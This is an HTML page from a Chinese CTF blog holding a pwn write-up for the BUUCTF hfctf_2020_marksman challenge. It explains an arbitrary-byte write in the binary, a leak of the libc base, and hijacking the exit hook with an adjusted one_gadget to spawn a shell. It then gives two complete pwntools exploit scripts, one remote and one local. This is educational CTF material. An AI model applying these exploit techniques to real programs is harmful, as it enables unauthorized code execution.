@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+<script async defer data-website-id="9aab3793-bf4f-4055-8c11-e23ab244a0d0" src="https://analyze.timochan.cn/umami.js"></script>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wp.zgroot.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="总结：通过这道题的学习与收获有： 1、atol函数放入的数据应该是打包之前的，而非是打包之后的数据 2、exit函数执行流程，exit函数的调用流程exit函数—&gt;run_exit_handlers函数—&gt;_dl_fini函数—&gt; rtld_lock_unlock_recursive指针 如果我们能够将最后的指针所指向的内容修改为one_gadget，那么即可获取shell。这个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF_hfctf_2020_marksman">
+<meta property="og:url" content="https://wp.zgroot.cn/BUU/BUUCTF_hfctf_2020_marksman/index.html">
+<meta property="og:site_name" content="楼上请让路*的WP">
+<meta property="og:description" content="总结：通过这道题的学习与收获有： 1、atol函数放入的数据应该是打包之前的，而非是打包之后的数据 2、exit函数执行流程，exit函数的调用流程exit函数—&gt;run_exit_handlers函数—&gt;_dl_fini函数—&gt; rtld_lock_unlock_recursive指针 如果我们能够将最后的指针所指向的内容修改为one_gadget，那么即可获取shell。这个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411120946223.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411120950796.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411120958456.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121014384.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121024407.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121037158.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121041168.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121048430.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121056518.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121101010.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121113453.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121117131.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121123210.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121129439.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121133711.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2706180/202203/2706180-20220323150832405-1323272271.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121140791.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121145701.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121152277.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121205022.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121210062.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121215901.png">
+<meta property="article:published_time" content="2022-04-13T12:46:25.000Z">
+<meta property="article:modified_time" content="2022-07-01T10:54:14.715Z">
+<meta property="article:author" content="楼上请让路*">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="one_gadget">
+<meta property="article:tag" content="劫持exit_hook">
+<meta property="article:tag" content="patch libc和ld">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wp.zgroot.cn/upload/img/image-20220411120946223.png">
+
+<link rel="canonical" href="https://wp.zgroot.cn/BUU/BUUCTF_hfctf_2020_marksman/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BUUCTF_hfctf_2020_marksman | 楼上请让路*的WP</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">楼上请让路*的WP</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">wp发布</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wp.zgroot.cn/BUU/BUUCTF_hfctf_2020_marksman/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/image.png">
+      <meta itemprop="name" content="楼上请让路*">
+      <meta itemprop="description" content="楼上请让路*的WP">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="楼上请让路*的WP">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BUUCTF_hfctf_2020_marksman
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-13 20:46:25 20:46:25" itemprop="dateCreated datePublished" datetime="2022-04-13T20:46:25+08:00">2022-04-13 20:46:25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-01 18:54:14 18:54:14" itemprop="dateModified" datetime="2022-07-01T18:54:14+08:00">2022-07-01 18:54:14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/BUU/" itemprop="url" rel="index"><span itemprop="name">BUU</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的学习与收获有：</p>
+<p>1、atol函数放入的数据应该是打包之前的，而非是打包之后的数据</p>
+<p>2、exit函数执行流程，<strong>exit函数的调用流程exit函数—&gt;run_exit_handlers函数—&gt;_dl_fini函数—&gt; rtld_lock_unlock_recursive指针</strong> 如果我们能够将最后的指针所指向的内容修改为one_gadget，那么即可获取shell。这个劫持exit_hook的可取之处在于，程序正常结束的话，最后都会调用这个exit函数</p>
+<p>3、学会了重新绑定程序所对应的libc动态库（patch libc和ld）。即使相同的libc库，在小版本不同的情况下，某些内容的偏移也是不一样的</p>
+<p>4、用这个方法可以在开了PIE的程序中下断点。gdb.attach(p, ‘b * $rebase(0xd63)\nc’)</p>
+<p>5、one_gadget加上参数-l2可以搜索更多的one_gadget。</p>
+<span id="more"></span>
+
+<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/upload/img/image-20220411120946223.png" alt="image-20220411120946223"></p>
+<h2 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h2><img src="/upload/img/image-20220411120950796.png" alt="image-20220411120950796" style="zoom:33%;" />
+
+
+
+<p>代码很少，漏洞也比较明显，我们可以控制v6的值，以及v7[j]。并且在printf函数中，<strong>程序自己打印了Puts的真实地址，就相当于我们已经拿到了libc基地址</strong>。</p>
+<p>也就是任意地址任意写。这里跟踪一下汇编代码，是怎么实现上述的任意地址任意写的。</p>
+<img src="/upload/img/image-20220411120958456.png" alt="image-20220411120958456" style="zoom:33%;" />
+
+<img src="/upload/img/image-20220411121014384.png" alt="image-20220411121014384" style="zoom:33%;" />
+
+
+<p>根据上面两幅图片，可以发现，<strong>最后的具体实现是mov [rax],dl这部分实现的。而rax最后溯源发现是sub_B78函数的返回值。</strong></p>
+<p>可以看见这个sub_B78的返回值就是atol函数的返回值（这个函数是有坑的，下面会说到）</p>
+<p><img src="/upload/img/image-20220411121024407.png" alt="image-20220411121024407"></p>
+<p>dl就是edx的最低字节。<strong>注意，mov [rax],dl []会去rax里面寻址，也就是说我们修改的内容应该被rax所指向。简单来说就是rax必须是个指针，而这个指针指向我们要修改的内容（而不能把rax寄存器里面直接放成我们要修改的内容）</strong></p>
+<p>值得一提的是，sub_bc2这个函数存在的目的就是去限制我们的one_gadget</p>
+<p><img src="/upload/img/image-20220411121037158.png" alt="image-20220411121037158"></p>
+<img src="/upload/img/image-20220411121041168.png" alt="image-20220411121041168" style="zoom:33%;" />
+
+
+
+<p>如此，我们现在有两种方法，<strong>要么使用one_gadget参数l2，去找寻更多的one_gadget（只不过使用条件可能更苛刻），还有一种方法是将one_gadget地址减5，以此来绕过检查</strong></p>
+<img src="/upload/img/image-20220411121048430.png" alt="image-20220411121048430" style="zoom:33%;" />
+
+<p><img src="/upload/img/image-20220411121056518.png" alt="image-20220411121056518"></p>
+<p>可以发现libc基地址只有后一个字节是00，倒数第二个字节并不完全是0，因此我们减5的话，将one_gadget指令抬高一个指令，这样最后一个字节绕过了检查，而倒数第二个字节加上libc基地址之后，也可以绕过检查。</p>
+<h2 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h2><p>这道题明显看出来也没机会再传参了，那就考虑one_gadget（我们是知道libc基地址的）。由于还可以任意地址任意写三字节，我是优先考虑的修改函数got表，<strong>但是很快就会发现程序是开了PIE保护的。got地址并不是固定的</strong>，同时我们还泄露不了栈地址，因此这个方法就被我打消了。但是我们是知道libc基地址的，因此我们现在的思路是想办法去libc里面找个指针（这个指针还必须指向一个被执行的地址），然后通过这个指针将one_gadget写入指针所指向的地方，最后获取shell。</p>
+<h2 id="关键知识点"><a href="#关键知识点" class="headerlink" title="关键知识点"></a>关键知识点</h2><p>通过调试发现了有三个地方都具备这样的指针。</p>
+<p>①puts函数调用了__strlen_sse2</p>
+<p><img src="/upload/img/image-20220411121101010.png" alt="image-20220411121101010"></p>
+<p>此时该函数已经在我们的动态库里面了，并且<strong>再次jmp到 rip+0x3c9f12所指向的地方</strong>，那我们只需要以rip+0x3c9f12的地址作为跳板，去将它所指向的地方最后三字节修改为onegadget即可（由于libc中的地址都是以libc基地址加偏移来寻址，这个偏移就占最后的三字节（前面的基地址大家都一样，因此只修改三字节即可）。</p>
+<p><img src="/upload/img/image-20220411121113453.png" alt="image-20220411121113453"></p>
+<p>要修改的地址距离libc基地址偏移为0x3eb0a2</p>
+<p>②   dlopen函数—&gt;_dlerror_run函数—&gt;_dl_catch_error函数</p>
+<p><img src="/upload/img/image-20220411121117131.png" alt="image-20220411121117131"></p>
+<p>这里原理同上，此时跳到了rip+0x2022a2<strong>所指向的地方</strong>。</p>
+<p><img src="/upload/img/image-20220411121123210.png" alt="image-20220411121123210"></p>
+<p>要修改的地址，距离libc基地址偏移0x5f4038</p>
+<p>③也是我想重点讲的exit hook劫持。</p>
+<p>exit函数的调用流程exit函数—&gt;__run_exit_handlers函数—&gt;_dl_fini函数—&gt; __rtld_lock_unlock_recursive指针（这是个结构体指针变量）</p>
+<p><img src="/upload/img/image-20220411121129439.png" alt="image-20220411121129439"></p>
+<p>而rtld_lock_unlock_recursive这个指针又指向了 __rtld_lock_default_lock_recursive</p>
+<p><img src="/upload/img/image-20220411121133711.png" alt="image-20220411121133711"><br><img src="https://img2022.cnblogs.com/blog/2706180/202203/2706180-20220323150832405-1323272271.png"></p>
+<p>可以看到最后又执行了这个 __rtld_lock_default_lock_recursive</p>
+<p>因此我们就把这个 __rtld_lock_default_lock_recursive指针当做跳板，去将它指向的内容（__rtld_lock_default_lock_recursive）也就是修改为one_gadget。</p>
+<p><img src="/upload/img/image-20220411121140791.png" alt="image-20220411121140791"></p>
+<p>因此这个rtld_lock_default_lock_recursive指针距离libc基地址的偏移为0x81df60。</p>
+<p>这里我因为libc的版本卡了很久，原先我那个也是2.27，不过好像是小版本不同，最后得出来的偏移和服务器那边版本的偏移差了0x1000。</p>
+<h2 id="patch-libc和ld过程"><a href="#patch-libc和ld过程" class="headerlink" title="patch libc和ld过程"></a>patch libc和ld过程</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41560595/article/details/114597342">https://blog.csdn.net/qq_41560595/article/details/114597342</a></p>
+<p>这篇文章很详细的记录了patch libc和ld的过程。</p>
+<p>我根据这篇文章再做一点补充</p>
+<p>想要下载某个版本的libc时，先cat list（此时应该先看上面那篇文章，先下载下来glibc-all-in-one</p>
+<img src="/upload/img/image-20220411121145701.png" alt="image-20220411121145701" style="zoom: 50%;" />
+
+<p><img src="/upload/img/image-20220411121152277.png" alt="image-20220411121152277"></p>
+<p>.&#x2F;download去下载下来你想要的libc版本（这道题应该选上图的这个版本）</p>
+<p><img src="/upload/img/image-20220411121205022.png" alt="image-20220411121205022"></p>
+<p>然后上面那篇文章中，这几个红色框的部分，是根据自己的路径来配置（别傻傻的全复制粘贴了）</p>
+<p><strong>这样做的好处就是，本地程序所依赖的libc库和远程的libc是一样的，这样拿到的关于libc基地址的任何偏移本地与远程就都是一样的了。</strong></p>
+<p>如果遇见下面这种报错的话<br><img src="/upload/img/image-20220411121210062.png" alt="image-20220411121210062"><br>在下载完patchelf之后，进入patchelf的目录，用下面这个命令安装一个工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install autoconf automake libtool</span><br></pre></td></tr></table></figure>
+<p>然后再输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">make check</span><br></pre></td></tr></table></figure>
+<p>之后就ok了。</p>
+<h2 id="再说关于atoi函数的那个坑。"><a href="#再说关于atoi函数的那个坑。" class="headerlink" title="再说关于atoi函数的那个坑。"></a>再说关于atoi函数的那个坑。</h2><p>结论</p>
+<p><strong>遇见atol函数的时候，要发打包前的数据，而不是打包后的数据</strong></p>
+<p>因为传给atol的参数会被遇见第一个不是0~9的字符所截断 从而返回之前的值，举个例子，你想打包的数据是1234，那么被打包之后就是\x04\x03\x02\x01，这些都是不可见字符，传入atol之后直接就被截断，导致atol返回值为0，使得后续的流程是错误的。</p>
+<img src="/upload/img/image-20220411121215901.png" alt="image-20220411121215901" style="zoom:33%;" />
+
+
+
+<p>exp</p>
+<p>打远程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27125</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * $rebase(0xd63)\nc&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ggg=libc_base+<span class="number">0x81df60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ggg))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sss=<span class="built_in">str</span>(ggg)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shoot!shoot!\n&quot;</span>, sss)</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f322</span>-<span class="number">5</span></span><br><span class="line"><span class="comment">#list=p64(one_gadget)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(one_gadget &amp; <span class="number">0xff</span>))<span class="comment">#chr目的是将16进制转化成一个字节发过去</span></span><br><span class="line">    one_gadget = one_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>打本地</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * $rebase(0xd63)\nc&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;xiamian&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">strlen=libc_base+<span class="number">0x3eb0a8</span><span class="comment">#这里我最开始调试得到的偏移是这个0x3eb0a8（当时我用的是本机自带的libc）,然后patch另一个libc之后，就变成0x3eb0a2了（我最开始用0x3eb0a8是打通了的）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(p64(puts_addr))</span><br><span class="line">sss=<span class="built_in">str</span>(strlen)</span><br><span class="line">p.sendline(sss)</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe54fe</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(one_gadget &amp; <span class="number">0xff</span>))</span><br><span class="line">    one_gadget = one_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>如果复制粘贴还打不通的话，九成九是libc版本的问题（本人就一菜鸡，如果写的哪有问题，欢迎指正）。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>楼上请让路*
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wp.zgroot.cn/BUU/BUUCTF_hfctf_2020_marksman/" title="BUUCTF_hfctf_2020_marksman">https://wp.zgroot.cn/BUU/BUUCTF_hfctf_2020_marksman/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+              <a href="/tags/one-gadget/" rel="tag"># one_gadget</a>
+              <a href="/tags/%E5%8A%AB%E6%8C%81exit-hook/" rel="tag"># 劫持exit_hook</a>
+              <a href="/tags/patch-libc%E5%92%8Cld/" rel="tag"># patch libc和ld</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/BUU/BUUCTF_jarvisoj_guess/" rel="prev" title="BUUCTF_jarvisoj_guess">
+      <i class="fa fa-chevron-left"></i> BUUCTF_jarvisoj_guess
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/BUU/BUUCTF_gwctf_2019_shellcode/" rel="next" title="BUUCTF_gwctf_2019_shellcode">
+      BUUCTF_gwctf_2019_shellcode <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">总结：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">保护策略：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">题目分析：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">4.</span> <span class="nav-text">做题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">5.</span> <span class="nav-text">关键知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#patch-libc%E5%92%8Cld%E8%BF%87%E7%A8%8B"><span class="nav-number">6.</span> <span class="nav-text">patch libc和ld过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%8D%E8%AF%B4%E5%85%B3%E4%BA%8Eatoi%E5%87%BD%E6%95%B0%E7%9A%84%E9%82%A3%E4%B8%AA%E5%9D%91%E3%80%82"><span class="nav-number">7.</span> <span class="nav-text">再说关于atoi函数的那个坑。</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="楼上请让路*"
+      src="/images/image.png">
+  <p class="site-author-name" itemprop="name">楼上请让路*</p>
+  <div class="site-description" itemprop="description">楼上请让路*的WP</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
